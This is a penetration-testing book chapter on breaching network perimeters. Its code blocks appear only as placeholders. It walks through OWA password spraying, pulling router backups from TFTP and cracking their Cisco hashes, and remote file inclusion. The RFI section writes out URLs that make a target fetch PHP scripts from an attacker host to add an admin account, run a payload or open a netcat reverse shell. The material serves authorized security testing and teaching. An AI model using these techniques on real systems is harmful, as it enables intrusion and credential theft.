- en: Chapter 7. Cracking the Perimeter with Python
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The toughest thing most assessors have to contend with is figuring a way to
    break into an internal network from over the Internet without phishing the organization's
    populace. There are occasionally widely exposed networks, but the majority of
    organizations have learned to tighten their external perimeters. Unfortunately,
    there is still the systemic problem of a hard exterior, and then a softer interior
    with light monitoring controls, which are not structured to prevent real malicious
    actors from compromising resources. This means that we should simulate the activity
    that malicious actors execute to crack the perimeter. This in turn means understanding
    what the typical perimeter looks like today.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding today's perimeter
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Some networks still have services exposed that they should not, but most of
    the time, these exposed services rarely present any exploitable risk. The highlighting
    of these specific examples will stage the mindset shift you need as an assessor
    who can crack the perimeter of an organization. These are not all-inclusive examples
    of what you may find exposed to the Internet, but they will highlight the commonalities.
  prefs: []
  type: TYPE_NORMAL
- en: Clear-text protocols
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: '**File Transfer Protocol** (**FTP**) and Telnet are examples of clear-text
    protocols, which could be exposed to the perimeter and are usually do not present
    the risk most automated tools rank them. This is unless the server contains critical
    data or can lead to critical data access, has known **Remote Code Execution**
    (**RCE**) vulnerabilities, or the solution has default or known credentials within
    it. They should still not be exposed to the Internet, but they are often not as
    dangerous as most **Vulnerability Management Systems** (**VMS**) rank the weakness.
    The reason for this is that for an attacker to take advantage of it, he or she
    has four primary methods of compromising an account.'
  prefs: []
  type: TYPE_NORMAL
- en: The most common is by sniffing the credentials, which means that he or she has
    to be either locally present at the client or server side of the communication,
    or in the channel through the routed path. The second method is by compromising
    a system that stores these credentials. The third is by executing some type of
    social engineering attack, which means that if a user is susceptible to the attack,
    those credentials may warrant access to many other services as well and not only
    clear text protocols. The fourth is by executing an online credential attack against
    the service, such as a password spray, dictionary attack, or brute force. This
    is not to say that there is no risk related to clear-text protocols, but instead
    to point out that it is more difficult to exploit than what the VMS solutions
    advertise.
  prefs: []
  type: TYPE_NORMAL
- en: Web applications
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: From years of assessments, compromises, and recommendations brought forth by
    security engineers, the primary example of exposed services today are web applications.
    These applications can be on a variety of ports, including nonstandard ports.
    They are often load balanced and potentially served through complex **Content
    Delivery Networks** (**CDN**), which effectively serve cached versions of the
    material provided from servers closer to the requesting user base. Additionally,
    these applications can be served from virtualized platforms that are sandboxed
    from other systems, within a provider's environment. So, even if you do crack
    the web application, you may not gain access to the target network. Keep this
    in mind if you are wondering why you cannot get anywhere after cracking the web
    application system. Also ensure that you have permission to test networks that
    are not controlled by the client.
  prefs: []
  type: TYPE_NORMAL
- en: Encrypted remote access services
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Services such as **Remote Desktop Protocol** (**RDP**) and **Secure Shell**
    (**SSH**), for example, often provide direct access to an internal network. These
    services can be protected by multifactor authentication and they are encrypted,
    which means that executing **Man-in-the-Middle** (**MitM**) attacks is far more
    difficult. So, targeting these services will depend on which controls are not
    in place versus the fact that they are present.
  prefs: []
  type: TYPE_NORMAL
- en: Virtual Private Networks (VPNs)
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In addition to web services, the other most common exposed service to the Internet
    are VPNs, which include, but not limited to **Point-to-Point Tunneling Protocol
    (PPTP)**, **Internet Security Association and Key Management Protocol (ISAKMP)**,
    or others. Attacks against these services are often multistage and require gaining
    other pieces of information, such as the group name or group password. This would
    be in addition to the standard username and password to authenticate as the specific
    user.
  prefs: []
  type: TYPE_NORMAL
- en: Many times, depending on the implementation, you may even need the specific
    software to associate with the device, such as Citrix or Cisco AnyConnect. Some
    vendors even have fees associated with the licensing of copies of their VPN software,
    so even if you do find all the necessary details, you may still need to find a
    copy of software that works, or the correct version. Additionally, pirating versions
    of these software components, as against purchasing them, may even open your or
    your client's network to compromises by using poisoned versions that may have
    their own liabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Mail services
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: We have spoken extensively about the manners in which mail services can be exploited.
    You will still see these services exposed, which means that there may still be
    an opportunity to find the desired details.
  prefs: []
  type: TYPE_NORMAL
- en: Domain Name Service (DNS)
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Services related to identifying **Internet Protocol** (**IP**) addresses related
    to **Fully Qualified Domain Names** (**FQDN**). Many times, these may be in the
    provided IP ranges, but they are actually out of scope, as they are owned by **Internet
    Service Providers** (**ISP**). Additionally, the vulnerabilities of yesterday,
    such as zone transfers, are not usually exploitable in today's networks.
  prefs: []
  type: TYPE_NORMAL
- en: User Datagram Protocol (UDP) services
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In addition to the services already mentioned that run as UDP services, you
    may find **Simple Network Management Protocol** (**SNMP**) and **Trivial File
    Transfer Protocol** (**TFTP**). Both of these services can provide details of
    and access to systems, depending on the information they reveal. SNMP can provide
    system details if you find the correct community string, and sometimes, it can
    even provide passwords to the system itself if the version is old enough, though
    this is much rarer on Internet-facing systems. TFTP, on the other hand, is used
    as a primary means to back up configurations for network devices, and firewall
    administrators often mistakenly expose the service to the Internet from a **Demilitarized
    Zone** (**DMZ**) or semi-trusted network.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: You can set up your own Ubuntu TFTP server to execute this attack against by
    downloading Ubuntu from [http://www.ubuntu.com/download/alternative-downloads](http://www.ubuntu.com/download/alternative-downloads)
    and setting up the server with details from [http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server](http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server).
  prefs: []
  type: TYPE_NORMAL
- en: Understanding the link between accounts and services
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When looking at resources to target in facing the Internet, you are trying to
    determine what services may have exposures that allow you to gain access to critical
    services. So, for example, SSH or Telnet may not be linked to a Windows account
    authentication unless the organization is very mature and is using a product such
    as Centrify. As such, dictionary attacks against these types of services may not
    provide access to a resource that will allow you to move laterally using the details
    extracted. Additionally, most administrative teams have pretty good monitoring
    of Linux and Unix based resources in the security environment due to the ease
    of incorporating such devices.
  prefs: []
  type: TYPE_NORMAL
- en: Cracking inboxes with Burp Suite
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We highlighted how to run password sprays with Burp Suite in [Chapter 6](ch06.html
    "Chapter 6. Assessing Web Applications with Python"), *Assessing Web Applications
    with Python*. One of the best targets to hit with Burp Suite is the **Outlook
    Web Access** (**OWA**) interface which faces the Internet. This is one of the
    simplest attacks you can carry out, but it is one of the loudest as well. You
    should always reduce the timing to hit the inboxes and use very common passwords
    that conform to the Active Directory's complexity requirements as mentioned in
    previous chapters.
  prefs: []
  type: TYPE_NORMAL
- en: Once you have identified a response with a different byte size when compared
    to previous requests may highlight that you have found an active inbox with a
    valid credential set. Use these details to access the inbox and look for critical
    data. Critical data includes anything that could be considered sensitive to the
    company, which would highlight risk to the leadership or showcase the need for
    immediate or planned activities, which would remediate said risk. It also includes
    anything that may allow you to get access to the organization itself.
  prefs: []
  type: TYPE_NORMAL
- en: Examples include passwords and usernames sent by e-mail, KeePass or LastPass
    files, remote access instructions to the network, VPN software, and sometimes
    even software tokens. Think about the stuff your organization sends around in
    e-mail; if there is no multifactor authentication, it is a great option for attack
    vectors. To this end, more organizations have moved to multifactor authentication,
    and as such, this attack vector is disappearing.
  prefs: []
  type: TYPE_NORMAL
- en: Identifying the attack path
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As mentioned in many books, including this one, people often forget about UDP.
    Often, this is partly because the response from scans against UDP services often
    lies. Return data from tools such as `nmap` and `scapy` can provide responses
    for ports that are actually open, but reported as `Open|Filtered`.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding the limitations of perimeter scanning
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: As an example, research on a host indicates that a TFTP server may be active
    on it based on the descriptive banner of another service, but scans using `nmap`
    point to the port as `open|filtered`.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following figure, shows the response for the UDP service TFTP as open|filtered,
    as described preceding, even though it known to be open:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_01.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'This means that the port may actually be open, but when copious responses show
    many ports to be represented in this way, you may have less trust in the results.
    Banner grabbing of each of these ports and protocols may not be possible, as there
    may be no actual banner to grab. Tools such as `scapy` can help resolve this issue
    by providing more detailed responses so that you can, in turn, interpret them
    yourself. As an example, using the following command could possibly elicit a response
    from a TFTP service:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'The following figure shows the execution of a UDP port scan from Scapy to determine
    if the TFTP service is truly exposed or not:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We see we have one unanswered response, about which we can get the details
    using the `summary()` function, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'This is not all that useful when scanning one port and one IP address, but
    had the test been for multiple IP addresses or ports, like the following scan,
    the `summary()` and `display()` functions would have been extremely useful:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Regardless of the results, TFTP is not responding to these scans, but this
    does not necessarily mean that the service is closed. Depending on the configuration
    and controls, most TFTP services will not respond to scans. Services such as these
    can be misleading, especially if a firewall is enabled. If you attempt to connect
    to the service, you may receive the same response as you would if no firewall
    was filtering the response to the actual client, as shown in this screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: This example was meant to highlight the fact that when it comes to exposed services,
    firewalls, and other protection mechanisms, you cannot trust your UDP scanners.
    You need to consider other details, such as hostnames, other service banners,
    and information sources. We are focusing on TFTP as an example because if it is
    exposed, it provides a neat feature for us as attackers; it does not require credentials
    to extract data. This means that we only need to know the proper filename to download
    it.
  prefs: []
  type: TYPE_NORMAL
- en: Downloading backup files from a TFTP server
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: So, to determine whether this system actually contains data we would like, we
    need to query the service for actual filenames. If we guess the correct filename,
    we can download the file on our system, but if we don't, the service will provide
    no response. This means that we have to identify likely filenames based on other
    service banners. As mentioned before, TFTP is most often used to store backups
    for network devices, and if the automated archive feature is used, we may be able
    to make an educated guess of the actual filename.
  prefs: []
  type: TYPE_NORMAL
- en: Typically, administrators use the hostname as the base name for the backup file,
    and then the backup file is incremented over time. Therefore, if the hostname
    is `example_router`, then the first backup that uses this feature would be `example_router-1`.
    So if you know the hostname, you can increment you can increment the number that
    follows the hostname, which represents the potential backup filenames. These requests
    could be done through tools such as Hydra and Metasploit, but you would have to
    generate a custom word list based on the hostname identified.
  prefs: []
  type: TYPE_NORMAL
- en: Instead, we can write a just in time Python script to meet this specific need,
    which would be a better fit. Just in time scripts are a concept that top-tier
    assessors use regularly. They generate a script to perform a task that no current
    tools perform with ease for a specific need. This means that we can find a way
    to automatically manipulate the environment in an unintended way that a VMS would
    not flag.
  prefs: []
  type: TYPE_NORMAL
- en: Determining the backup filenames
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: To determine the potential backup filename range, you need to identify the hostnames
    that might be part of the regular backup routine. This means connecting to services
    such as Telnet, FTP, and SSH to extract banners. Grabbing banners of numerous
    services can be time-consuming, even with Bash, `for` loops, and `netcat`. To
    overcome this challenge, we can write a short script that will connect to all
    of these services for us, as shown in the following code, and even expand on it
    if needed in future.
  prefs: []
  type: TYPE_NORMAL
- en: 'This script uses a list of ports and feeds them to each IP address tested.
    We are using a range of potential IP addresses appended as the forth octet to
    a base IP address. You could generate additional code to read IPs from a file
    or create a dynamic list from **Classless Inter-domain Routing** (**CIDR**) addresses,
    but that would take additional time. The following script, as it stands, meets
    our immediate requirement:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: When the script responds with active banners, we can go and grab the details
    of the services. This can be done with tools such as `nmap`, but the framework
    of the script can be adjusted to grab more or less details, perform follow-up
    requests, and even languish for longer periods of times if necessary. So, this
    script could be used if `nmap` or other tools are not picking up details correctly.
    It should be noted that this is significantly slower than other tools, and it
    should be approached as a secondary tool, not a primary.
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: As just mentioned, `nmap` can do similar things at a faster pace using the NSE
    banner script, as described at [https://nmap.org/nsedoc/scripts/banner.html](https://nmap.org/nsedoc/scripts/banner.html).
  prefs: []
  type: TYPE_NORMAL
- en: 'From the banner grabbing results, we can now write a Python script that would
    be able to increment through potential backup filenames and try and download them.
    So, we are going to create a directory to store all the potential files that will
    be requested from this quick and script. Inside this directory, we can then list
    the contents and see which have more than 0 bytes of content. If we see that the
    content is more than 0 bytes, we know that we have successfully grabbed a backup
    file. We will create a directory called backups and run this script from it:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'As you can see, this script was written to look for backups of the router names
    from `example_router-0` to `example_router-99`. The results can be seen in the
    output directory, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Determining the backup filenames](img/B04315_07_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, we only need to determine how big each file is to find an actual backup
    for the router using the `ls -l` command. The sample output of this command can
    be seen in the following screenshot. As you can see here, `example_router-5` seems
    to be an actual file that contains data:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Determining the backup filenames](img/B04315_07_06.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Cracking Cisco MD5 hashes
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Now we can see whether there are any hashed passwords in the backup file, as
    shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Cracking Cisco MD5 hashes](img/B04315_07_07.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The tool John the Ripper can now be used to crack these hashes after they have
    been formatted correctly. To do this, put these hashes in a format that appears
    as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'The tool John the Ripper requires the data from the back-up file to be prsented
    in a particular format so that it can be processed. The following excerpt shows
    how these hashes need to be formatted so that they can be processed:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'We then place these hashes in a text file such as `cisco_hash` and run John
    the Ripper against it, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: Once done, you can look at the results with `john --show cisco_hash`, and use
    the extracted credentials to log in to the device to elevate your privileges and
    adjust its details. Using this access, and if the router was the primary perimeter
    protection, you could potentially adjust the protections to provide your public
    IP address additional access to internal resources.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Remember to use that script you wrote to grab your public IP address to make
    your life easier.
  prefs: []
  type: TYPE_NORMAL
- en: You should approach doing this very carefully, even on a red team engagement.
    Manipulation of perimeter firewalls may adversely affect the organization. Instead,
    you should consider highlighting the access you have achieved and request that
    an entry be made for your public IP address to access the semi-trusted or protected
    network, depending on the nature of the engagement. Keep in mind that unless a
    device has a routable IP as in a public or Internet-facing address, you may still
    not be able to see it from over the Internet, but you may be able to see ports
    and services that were previously obfuscated from you. An example of this is a
    web server that has RDP enabled behind a firewall. Once the adjustment of perimeter
    rules has been executed, you may have access to RDP on the web server.
  prefs: []
  type: TYPE_NORMAL
- en: Gaining access through websites
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Exploiting websites that face the Internet will typically be the most viable
    option in cracking the perimeter of an organization. There are a number of ways
    of doing this, but the best vulnerabilities that provide access include **Structured
    Query Language** (**SQL**) **Structured Query Language injection** (**SQLi**),
    **Command-line Injection** (**CLI**), **Remote and Local File Inclusion** (**RFI**/**LFI**),
    and unprotected file uploads. There is a copious amount of information regarding
    the execution of vulnerabilities related to SQLi, CLI, LFI, and file uploads,
    but attacking through RFI has rather sparse information and vulnerability is prevalent.
  prefs: []
  type: TYPE_NORMAL
- en: The execution of file inclusion attacks
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'To look for file inclusion vectors, you need to look for vectors that reference
    resources, either locally on the server such as files, or to other resources on
    the Internet:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.example.website.com/?target=file.txt](http://www.example.website.com/?target=file.txt)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Remote file inclusion typically references content from other sites or incorporations:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.example.website.com/?target=trustedsite.com/content.html](http://www.example.website.com/?target=trustedsite.com/content.html)'
  prefs: []
  type: TYPE_NORMAL
- en: The reason we highlight LFI in addition to the strict RFI example is that a
    file inclusion vulnerability may often work both ways for noticeable LFI and RFI
    vectors. It should be noted that just because there is a reference to a remote
    or local file does not mean that it is vulnerable.
  prefs: []
  type: TYPE_NORMAL
- en: 'After noticing the differences, we can attempt to determine whether the site
    would be viable for an attack depending on the underlying architecture: Windows
    or Linux/UNIX. First, we have to prepare our attack environment, which means standing
    up against an Internet-facing web server and positioning attack files in it. Fortunately,
    Python makes this easy with `SimpleHTTPServer`. First we create a directory that
    will host our files called `server`, then we cd to that directory and then we
    create the web server instance with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'You can then visit the site by entering the host IP address with port number
    8000 in the **Uniform Resource Locator** (**URL**) request bar separated by a
    column. Once you do this, you will see a number of requests going to the server
    to get information. This new server, to which you have just stood up, can be used
    to reference scripts to be run on the target server. This screenshot shows the
    relevant requests being made to the server:'
  prefs: []
  type: TYPE_NORMAL
- en: '![The execution of file inclusion attacks](img/B04315_07_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As mentioned previously, other protocols are sometimes available to interact
    with on the target web server. If you have provided yourself more access to a
    semi-trusted network or DMZ by adding your IP address to an authorization list
    in a firewall or **Access Control List** (**ACL**), you may be able to see services
    such as a **Server Message Block** (**SMB**) or RDP. So, depending on the environment,
    you may not have to provide additional access to yourself; just cracking the web
    server could provide you with enough access.
  prefs: []
  type: TYPE_NORMAL
- en: Most file inclusion vulnerabilities are related to **Hypertext Preprocessor**
    (**PHP**) websites. Other language sets can be vulnerable, but PHP-based sites
    are the most common. So let's create some PHP scripts disguised as text files
    to verify the vulnerability and exploit the underlying server.
  prefs: []
  type: TYPE_NORMAL
- en: Verifying an RFI vulnerability
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'When you suspect that you have found an RFI exposure, you will need to verify
    that there is actually a vulnerability before exploiting it. First, start up a
    `tcpdump` service on the Internet-facing server and make it listen for **Internet
    Control Message Protocol** (**ICMP**) echoes with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'This command will produce a file that will capture all of these messages sent
    by a `ping` command. Ping the exposed web server, find the actual IP address for
    the server, and record it. Then, create the following PHP file, which is stored
    as a text file called `ping.txt`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: 'You can now execute the attack by referencing the file with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Once the attack has been executed, you can review the **Packet Capture (PCAP)**
    with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: If you see ICMP echoes from the same server as the one you pinged, then you
    know that the server is vulnerable to RFI.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting the hosts through RFI
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'When you find a Windows host that is vulnerable, it is often running as a privileged
    account. So, to begin, it may be useful to add another local administrator account
    to the system through a PHP script. This is done by creating the following script
    and writing it to a text file such as `account.txt`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'Now all we have to do is reference the script from our exposed server, like
    this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt)'
  prefs: []
  type: TYPE_NORMAL
- en: If possible, this will create a new malicious local administrator on the server,
    which we can use to gain access to the server. If the system had RDP exposed to
    the Internet, our job would have been done here, and we would just log in to the
    system directly with our new account. If this is not the case, then we would need
    to find another way to exploit the system; to do that, we are going to use actual
    payloads.
  prefs: []
  type: TYPE_NORMAL
- en: Create a payload as highlighted in [Chapter 5](ch05.html "Chapter 5. Exploiting
    Services with Python"), *Exploiting Services with Python*, and move it to the
    directory that is used to store the referenced files.
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: The best LPORTs to use for this attack are port 80, port 443, and port 53\.
    Just make sure that you have no conflicts for these services.
  prefs: []
  type: TYPE_NORMAL
- en: 'Create a new PHP script that will be able to directly download the file and
    execute it, called `payload_execute.txt`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: 'Now, set up your listener (as detailed in [Chapter 5](ch05.html "Chapter 5. Exploiting
    Services with Python"), *Exploiting Services with Python*) to listen for the defined
    local port. Finally, load the new script into the RFI request and watch your new
    potential shell appear:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt)'
  prefs: []
  type: TYPE_NORMAL
- en: These are samples of how you can take advantage of a Windows host, but what
    if it is a Linux system? Depending on the permission structure of the host, it
    may be more difficult to gain a shell. That said, you can potentially look around
    the localhost to identify local files and repositories that may contain clear
    text passwords.
  prefs: []
  type: TYPE_NORMAL
- en: 'Linux and Unix hosts provide attackers with the benefit of typically having
    `netcat` and several scripting languages installed. Each of these could provide
    a command shell back to an attacker''s listening system. As an example of this,
    set up a `netcat` listener on an Internet-facing host with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, create a PHP script stored in a text file such as `netcat.txt`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: 'Next, run the script by referencing the script in the URL as shown previously:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt)'
  prefs: []
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: There are several examples that show how to set up other backdoors on a system,
    as highlighted at [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
  prefs: []
  type: TYPE_NORMAL
- en: For both Windows and Linux hosts, there is the `php_include` exploit for Metasploit,
    which allows you to inject an attack directly into RFI. PHP Meterpreters are limited
    and not very stable, so you would still need to download a full Meterpreter and
    execute it after you gain your foothold on a Windows system. On Linux systems,
    you should extract the `passwd` and `shadow` files and crack them to gain true
    local access.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This chapter highlighted common ways to crack the perimeter against specific
    services that are exposed. However, we did not cover the most common method of
    cracking the perimeter, which is phishing. Phishing, a type of social engineering,
    is an art unto itself and could take several chapters to describe, but you should
    know that real attackers used to phish if they could not find an easy method to
    get into the environment. Today, malicious actors typically start with phishing
    because it is easy to lure victims.
  prefs: []
  type: TYPE_NORMAL
- en: After these entry vectors, assessors and malicious actors watch for newly patched
    zero-days, such as Shellshock and Heartbleed, which were identified in 2014\.
    Examples like these are often exploitable even months after a new patch is provided,
    but what if you think you have found a vulnerability in an exposed service for
    which there is no exploit available, or you have discovered a potential zero-day?
    Though rarely, penetration testers can be granted the opportunity to test potential
    zero-days, but typically in a more controlled environment prove a concept of compromise.
    In the next chapter, we will discuss this in more depth.
  prefs: []
  type: TYPE_NORMAL
